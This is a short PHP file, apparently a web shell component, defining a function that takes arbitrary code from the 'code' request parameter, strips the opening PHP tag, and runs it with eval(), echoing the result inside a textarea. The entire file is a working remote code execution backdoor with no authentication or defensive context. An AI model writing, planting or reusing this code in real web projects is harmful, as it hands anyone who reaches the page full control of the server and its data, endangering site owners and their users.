<?php
function phpevaL(){
	echo "<center><textarea rows=\"10\" cols=\"64\">";
	$code = str_replace("<?php","",$_REQUEST['code']);
	eval($code);
	echo "</textarea></center><br>";
}

phpevaL();
?>